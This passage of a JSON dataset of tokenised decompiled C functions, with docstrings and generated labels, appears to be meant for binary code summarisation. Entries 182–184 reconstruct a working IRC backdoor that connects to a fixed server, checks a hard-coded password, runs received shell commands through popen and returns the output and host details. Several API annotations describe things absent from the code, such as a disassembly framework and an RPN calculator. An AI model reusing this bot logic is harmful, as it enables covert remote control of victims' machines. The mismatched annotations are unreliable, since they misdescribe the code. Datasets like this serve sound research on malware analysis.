            "{",
            "fwrite",
            "(",
            "\"Mysteriously still running as root... Goodbye.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2FuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __read appears to be part of a larger system, possibly an operating system or a device driver framework, facilitating low-level I/O operations such as device reading, file reading, and potentially interacting with dump files, likely serving as an abstraction layer for various input/output operations within the system.",
            "The perror function is used to print a descriptive error message to stderr based on the current value of errno, typically used after encountering an error in I/O operations, as demonstrated in the provided code snippets where it's invoked in case of a failed write operation.",
            "The function `resgid` appears to be involved in setting and managing process resource IDs, specifically handling the effective, real, and saved group IDs, likely within a larger system or application authentication or privilege escalation mechanism.",
            "The \"groups\" function appears to be a part of the Capstone disassembly framework, likely responsible for checking if a specified group ID exists within the groups associated with a given instruction, facilitating analysis of disassembled code.",
            "The function `resuid` likely manipulates and manages user and group ID-related attributes of a file system, as indicated by the presence of fields like `s_def_resuid` and `s_def_regid` in the code snippets, possibly for setting or querying default user and group IDs for reserved blocks within a file system structure."
        ],
        "longer_label": "The code defines a function `drop_privileges` that attempts to drop root privileges, setting process resource limits and changing user and group IDs, with error handling and checks to ensure it doesn't execute as root."
    },
    {
        "id": 181,
        "docstring_tokens": [
            "The",
            "code",
            "sets",
            "the",
            "process",
            "name",
            ",",
            "copies",
            "the",
            "name",
            "to",
            "the",
            "first",
            "element",
            "of",
            "the",
            "argument",
            "list",
            ",",
            "and",
            "clears",
            "the",
            "remaining",
            "elements",
            "of",
            "the",
            "argument",
            "list",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "set_process_name",
            "(",
            "char",
            "*",
            "src",
            ",",
            "int",
            "a2",
            ",",
            "char",
            "*",
            "*",
            "a3",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "const",
            "char",
            "*",
            "v6",
            ";",
            "char",
            "*",
            "result",
            ";",
            "prctl",
            "(",
            "15",
            ",",
            "src",
            ")",
            ";",
            "v4",
            "=",
            "a3",
            "[",
            "a2",
            "-",
            "1",
            "]",
            ";",
            "v5",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v4",
            "[",
            "strlen",
            "(",
            "v4",
            ")",
            "]",
            ";",
            "strcpy",
            "(",
            "*",
            "a3",
            ",",
            "src",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "a3",
            ";",
            "result",
            "=",
            "(",
            "char",
            "*",
            ")",
            "strlen",
            "(",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "(",
            "char",
            "*",
            ")",
            "v5",
            ">",
            "&",
            "result",
            "[",
            "(",
            "_QWORD",
            ")",
            "v6",
            "]",
            ")",
            "return",
            "(",
            "char",
            "*",
            ")",
            "memset",
            "(",
            "&",
            "result",
            "[",
            "(",
            "_QWORD",
            ")",
            "v6",
            "]",
            ",",
            "0",
            ",",
            "v5",
            "-",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "result",
            "[",
            "(",
            "_QWORD",
            ")",
            "v6",
            "]",
            ")",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"memset\" function is used to fill a block of memory with a specified value."
        ],
        "longer_label": "The provided code sets the name of a process and ensures that the process name buffer is properly null-terminated."
    },
    {
        "id": 182,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "child",
            "process",
            "that",
            "connects",
            "to",
            "an",
            "IRC",
            "server",
            ",",
            "sends",
            "various",
            "IRC",
            "messages",
            "including",
            "joining",
            "a",
            "channel",
            "and",
            "sending",
            "a",
            "private",
            "message",
            ",",
            "enters",
            "a",
            "main",
            "loop",
            "for",
            "handling",
            "incoming",
            "data",
            "from",
            "the",
            "server",
            ",",
            "and",
            "finally",
            "sends",
            "a",
            "quit",
            "message",
            "before",
            "closing",
            "the",
            "connection",
            "and",
            "exiting",
            "."
        ],
        "code_tokens": [
            "int",
            "__noreturn",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "struct",
            "hostent",
            "*",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "char",
            "*",
            "*",
            "h_addr_list",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "char",
            "*",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "char",
            "*",
            "v14",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "char",
            "needle",
            "[",
            "10",
            "]",
            ";",
            "char",
            "buf",
            "[",
            "512",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fork",
            "(",
            ")",
            ")",
            "{",
            "v3",
            "=",
            "gethostbyname",
            "(",
            "\"irc.woodruffw.us\"",
            ")",
            ";",
            "v4",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "h_addr_list",
            "=",
            "v3",
            "-",
            ">",
            "h_addr_list",
            ";",
            "addr",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "h_addr_list",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_family",
            "=",
            "186253314",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "v6",
            ";",
            "connect",
            "(",
            "v4",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "gen_nick",
            "(",
            "(",
            "__int64",
            ")",
            "needle",
            ")",
            ";",
            "__snprintf_chk",
            "(",
            "buf",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"NICK %s\\r\\n\"",
            ",",
            "needle",
            ")",
            ";",
            "send",
            "(",
            "v4",
            ",",
            "buf",
            ",",
            "strlen",
            "(",
            "buf",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v7",
            "=",
            "128L",
            "L",
            ";",
            "v8",
            "=",
            "buf",
            ";",
            "while",
            "(",
            "v7",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v8",
            "=",
            "0",
            ";",
            "v8",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v7",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "buf",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"USER %s 0 * :et phone home\\r\\n\"",
            ",",
            "needle",
            ")",
            ";",
            "send",
            "(",
            "v4",
            ",",
            "buf",
            ",",
            "strlen",
            "(",
            "buf",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v9",
            "=",
            "128L",
            "L",
            ";",
            "v10",
            "=",
            "buf",
            ";",
            "while",
            "(",
            "v9",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v10",
            "=",
            "0",
            ";",
            "v10",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v9",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "buf",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"JOIN :%s\\r\\n\"",
            ",",
            "\"#et\"",
            ")",
            ";",
            "send",
            "(",
            "v4",
            ",",
            "buf",
            ",",
            "strlen",
            "(",
            "buf",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v11",
            "=",
            "128L",
            "L",
            ";",
            "v12",
            "=",
            "buf",
            ";",
            "while",
            "(",
            "v11",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v12",
            "=",
            "0",
            ";",
            "v12",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v11",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "buf",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ",",
            "\"phoning home\"",
            ")",
            ";",
            "send",
            "(",
            "v4",
            ",",
            "buf",
            ",",
            "strlen",
            "(",
            "buf",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v13",
            "=",
            "128L",
            "L",
            ";",
            "v14",
            "=",
            "buf",
            ";",
            "while",
            "(",
            "v13",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v14",
            "=",
            "0",
            ";",
            "v14",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v13",
            ";",
            "}",
            "et_main_loop_nix",
            "(",
            "v4",
            ",",
            "needle",
            ")",
            ";",
            "send",
            "(",
            "v4",
            ",",
            "\"QUIT\"",
            ",",
            "4uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "close",
            "(",
            "v4",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit quadword from the FS segment register on x86/x64 architectures, typically used for accessing thread-local storage or other system-specific data structures.",
            "The `printf` function in the provided code snippets is part of a larger program, likely implementing a Reverse Polish Notation (RPN) calculator, where it's used for printing formatted output, possibly including calculation results or debugging information."
        ],
        "longer_label": "The provided code establishes a connection to an IRC server, sends commands to join a channel and send a message, likely for the purpose of remote control, utilizing system-specific functions like `fork` and `__readfsqword`, alongside thread-local storage, while annotations suggest the presence of a Reverse Polish Notation (RPN) calculator utilizing `printf`."
    },
    {
        "id": 183,
        "docstring_tokens": [
            "The",
            "function",
            "et_main_loop_nix",
            "reads",
            "messages",
            "from",
            "a",
            "socket",
            ",",
            "responds",
            "to",
            "PING",
            "requests",
            ",",
            "authenticates",
            "users",
            ",",
            "and",
            "executes",
            "various",
            "commands",
            "based",
            "on",
            "the",
            "input",
            "received",
            ",",
            "sending",
            "the",
            "output",
            "back",
            "to",
            "the",
            "socket",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "et_main_loop_nix",
            "(",
            "int",
            "fd",
            ",",
            "char",
            "*",
            "needle",
            ")",
            "{",
            "char",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "char",
            "*",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "char",
            "*",
            "v9",
            ";",
            "const",
            "char",
            "*",
            "v10",
            ";",
            "char",
            "*",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "char",
            "*",
            "v13",
            ";",
            "bool",
            "v14",
            ";",
            "int",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "char",
            "*",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "char",
            "*",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "char",
            "*",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "char",
            "*",
            "v23",
            ";",
            "char",
            "*",
            "v24",
            ";",
            "FILE",
            "*",
            "v25",
            ";",
            "char",
            "*",
            "i",
            ";",
            "struct",
            "utsname",
            "name",
            ";",
            "char",
            "v29",
            "[",
            "512",
            "]",
            ";",
            "char",
            "ptr",
            "[",
            "512",
            "]",
            ";",
            "char",
            "buf",
            "[",
            "1024",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v32",
            ";",
            "v32",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "LABEL_2",
            ":",
            "v3",
            "=",
            "0",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "v4",
            "=",
            "128L",
            "L",
            ";",
            "v5",
            "=",
            "v29",
            ";",
            "while",
            "(",
            "v4",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v5",
            "=",
            "0",
            ";",
            "v5",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v4",
            ";",
            "}",
            "v6",
            "=",
            "256L",
            "L",
            ";",
            "v7",
            "=",
            "buf",
            ";",
            "while",
            "(",
            "v6",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v7",
            "=",
            "0",
            ";",
            "v7",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v6",
            ";",
            "}",
            "recv",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "0x3FFuL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v32",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "buf",
            ",",
            "\"PING\"",
            ")",
            "&",
            "&",
            "!",
            "strstr",
            "(",
            "buf",
            ",",
            "\"CASEMAPPING\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PONG :%s\\r\\n\"",
            ",",
            "\"irc.woodruffw.us\"",
            ")",
            ";",
            "LABEL_19",
            ":",
            "v12",
            "=",
            "-",
            "1L",
            "L",
            ";",
            "v13",
            "=",
            "v29",
            ";",
            "do",
            "{",
            "LABEL_20",
            ":",
            "if",
            "(",
            "!",
            "v12",
            ")",
            "break",
            ";",
            "v14",
            "=",
            "*",
            "v13",
            "+",
            "+",
            "=",
            "=",
            "0",
            ";",
            "-",
            "-",
            "v12",
            ";",
            "}",
            "while",
            "(",
            "!",
            "v14",
            ")",
            ";",
            "goto",
            "LABEL_22",
            ";",
            "}",
            "}",
            "while",
            "(",
            "!",
            "strstr",
            "(",
            "buf",
            ",",
            "\"PRIVMSG\"",
            ")",
            "|",
            "|",
            "!",
            "strstr",
            "(",
            "buf",
            ",",
            "needle",
            ")",
            ")",
            ";",
            "v8",
            "=",
            "strtok",
            "(",
            "buf",
            ",",
            "\"\\r\\n\"",
            ")",
            ";",
            "v9",
            "=",
            "strrchr",
            "(",
            "v8",
            ",",
            "58",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            "+",
            "1",
            ";",
            "v11",
            "=",
            "v9",
            ";",
            "if",
            "(",
            "!",
            "strstr",
            "(",
            "v9",
            "+",
            "1",
            ",",
            "\"auth\"",
            ")",
            "|",
            "|",
            "strstr",
            "(",
            "v10",
            ",",
            "\"deauth\"",
            ")",
            ")",
            "break",
            ";",
            "if",
            "(",
            "strcmp",
            "(",
            "v11",
            "+",
            "6",
            ",",
            "\"et-phone-home\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Authorization failed, password incorrect.\\r\\n\"",
            ",",
            "\"#et\"",
            ")",
            ";",
            "goto",
            "LABEL_19",
            ";",
            "}",
            "v3",
            "=",
            "1",
            ";",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Successfully authorized. %s listening.\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Not authorized to command. Please auth.\\r\\n\"",
            ",",
            "\"#et\"",
            ")",
            ";",
            "v12",
            "=",
            "-",
            "1L",
            "L",
            ";",
            "v13",
            "=",
            "v29",
            ";",
            "goto",
            "LABEL_20",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "v10",
            ",",
            "\"kill\"",
            ")",
            ")",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v32",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "v10",
            ",",
            "\"deauth\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s deauthorized. Reauth to control.\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "goto",
            "LABEL_2",
            ";",
            "}",
            "v15",
            "=",
            "strcmp",
            "(",
            "v10",
            ",",
            "\"info\"",
            ")",
            ";",
            "if",
            "(",
            "v15",
            ")",
            "{",
            "if",
            "(",
            "strstr",
            "(",
            "v10",
            ",",
            "\"popup\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s is nix and cannot create popups.\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ")",
            ";",
            "LABEL_48",
            ":",
            "v12",
            "=",
            "-",
            "1L",
            "L",
            ";",
            "v24",
            "=",
            "v29",
            ";",
            "goto",
            "LABEL_49",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "v10",
            ",",
            "\"persist\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s is nix and cannot persist.\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ")",
            ";",
            "goto",
            "LABEL_48",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "v10",
            ",",
            "\"depersist\"",
            ")",
            ")",
            "{",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s is nix and cannot depersist.\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "needle",
            ")",
            ";",
            "goto",
            "LABEL_48",
            ";",
            "}",
            "v25",
            "=",
            "popen",
            "(",
            "v10",
            ",",
            "\"r\"",
            ")",
            ";",
            "fread",
            "(",
            "ptr",
            ",",
            "1uL",
            "L",
            ",",
            "0x200uL",
            "L",
            ",",
            "v25",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "ptr",
            ";",
            "*",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "i",
            "=",
            "=",
            "10",
            ")",
            "*",
            "i",
            "=",
            "32",
            ";",
            "}",
            "if",
            "(",
            "strlen",
            "(",
            "ptr",
            ")",
            "<",
            "=",
            "0x1F3",
            ")",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :%s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "ptr",
            ")",
            ";",
            "else",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Command output too large to send.\\r\\n\"",
            ",",
            "\"#et\"",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "pclose",
            "(",
            "v25",
            ")",
            ";",
            "}",
            "else",
            "{",
            "uname",
            "(",
            "&",
            "name",
            ")",
            ";",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Kernel: %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "name",
            ".",
            "sysname",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v16",
            "=",
            "128L",
            "L",
            ";",
            "v17",
            "=",
            "v29",
            ";",
            "while",
            "(",
            "v16",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v17",
            "=",
            "v15",
            ";",
            "v17",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v16",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Host: %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "name",
            ".",
            "nodename",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v18",
            "=",
            "128L",
            "L",
            ";",
            "v19",
            "=",
            "v29",
            ";",
            "while",
            "(",
            "v18",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v19",
            "=",
            "v15",
            ";",
            "v19",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v18",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Release: %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "name",
            ".",
            "release",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v20",
            "=",
            "128L",
            "L",
            ";",
            "v21",
            "=",
            "v29",
            ";",
            "while",
            "(",
            "v20",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v21",
            "=",
            "v15",
            ";",
            "v21",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v20",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Version: %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "name",
            ".",
            "version",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "strlen",
            "(",
            "v29",
            ")",
            ",",
            "0",
            ")",
            ";",
            "v22",
            "=",
            "128L",
            "L",
            ";",
            "v23",
            "=",
            "v29",
            ";",
            "while",
            "(",
            "v22",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v23",
            "=",
            "v15",
            ";",
            "v23",
            "+",
            "=",
            "4",
            ";",
            "-",
            "-",
            "v22",
            ";",
            "}",
            "__snprintf_chk",
            "(",
            "v29",
            ",",
            "512L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "512L",
            "L",
            ",",
            "\"PRIVMSG %s :Arch: %s\\r\\n\"",
            ",",
            "\"#et\"",
            ",",
            "name",
            ".",
            "machine",
            ")",
            ";",
            "v12",
            "=",
            "-",
            "1L",
            "L",
            ";",
            "v24",
            "=",
            "v29",
            ";",
            "do",
            "{",
            "LABEL_49",
            ":",
            "if",
            "(",
            "!",
            "v12",
            ")",
            "break",
            ";",
            "v14",
            "=",
            "*",
            "v24",
            "+",
            "+",
            "=",
            "=",
            "0",
            ";",
            "-",
            "-",
            "v12",
            ";",
            "}",
            "while",
            "(",
            "!",
            "v14",
            ")",
            ";",
            "LABEL_22",
            ":",
            "send",
            "(",
            "fd",
            ",",
            "v29",
            ",",
            "-",
            "v12",
            "-",
            "2",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code appears to be a main loop function for a Unix-based application, which listens for commands on a given file descriptor and performs various actions based on the received commands."
    },
    {
        "id": 184,
        "docstring_tokens": [
            "The",
            "function",
            "generates",
            "a",
            "random",
            "nickname",
            "starting",
            "with",
            "``",
            "et",
            "''",
            "followed",
            "by",
            "a",
            "random",
            "number",
            "between",
            "0",
            "and",
            "99999999",
            "and",
            "stores",
            "it",
            "in",
            "the",
            "given",
            "character",
            "array",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "v1",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "srand",
            "(",
            "v1",
            ")",
            ";",
            "v2",
            "=",
            "rand",
            "(",
            ")",
            ";",
            "return",
            "__snprintf_chk",
            "(",
            "a1",
            ",",
            "10L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "-",
            "1L",
            "L",
            ",",
            "\"et%d\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "%",
            "10000000",
            ")",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `snprintf` function is used to safely format a string into a buffer with specified size, preventing buffer overflow, as demonstrated in the provided code snippets where it's used to concatenate directory paths and format error messages."
        ],
        "longer_label": "The provided code defines a function `gen_nick` that generates a random nickname by formatting a random number between 0 and 9999999 into a string prefixed with \"et\", using `snprintf` to prevent buffer overflow."
    },
    {
        "id": 185,
        "docstring_tokens": [
            "The",
            "cipher",
            "function",
            "takes",
            "a",
            "set",
            "of",
            "parameters",
            ",",
            "initializes",
            "an",
            "EVP_CIPHER_CTX",
            ",",
            "performs",
            "encryption",
            "or",
            "decryption",
            "using",
            "the",
            "provided",
            "cipher",
            ",",
            "key",
            ",",
            "and",
            "IV",
            ",",
            "and",
            "writes",
            "the",
            "result",
            "to",
            "an",
            "output",
            "file",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "Params_0",
            "*",
            "p",
            ")",
            "{",
            "Params_0",
            "*",
            "v1",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "char",
            "*",
            "*",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "void",
            "*",
            "v7",
            ";",
            "unsigned",
            "int",
            "encrypt",
            ";",
            "FILE",
            "*",
            "out",
            ";",
            "unsigned",
            "__int8",
            "*",
            "IV",
            ";",
            "FILE",
            "*",
            "plaintext",
            ";",
            "unsigned",
            "int",
            "v12",
            ";",
            "unsigned",
            "__int8",
            "*",
            "v13",
            ";",
            "FILE",
            "*",
            "v14",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "v15",
            ")",
            "[",
            "]",
            ";",
            "FILE",
            "*",
            "v16",
            ";",
            "size_t",
            "v17",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "v18",
            ")",
            "[",
            "]",
            ";",
            "_QWORD",
            "v19",
            "[",
            "4",
            "]",
            ";",
            "size_t",
            "n",
            ";",
            "__int64",
            "v21",
            ";",
            "char",
            "*",
            "v22",
            ";",
            "Params_0",
            "*",
            "pa",
            ";",
            "int",
            "num_bytes_read",
            ";",
            "int",
            "cipher_block_size",
            ";",
            "__int64",
            "v26",
            ";",
            "unsigned",
            "__int8",
            "(",
            "*",
            "p_out_buf",
            ")",
            "[",
            "]",
            ";",
            "EVP_CIPHER_CTX",
            "*",
            "ctx",
            ";",
            "char",
            "v29",
            "[",
            "1176",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v30",
            ";",
            "pa",
            "=",
            "p",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v29",
            ";",
            "v22",
            "=",
            "v29",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "1152L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 7 out_len 96 1024 6 in_buf \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
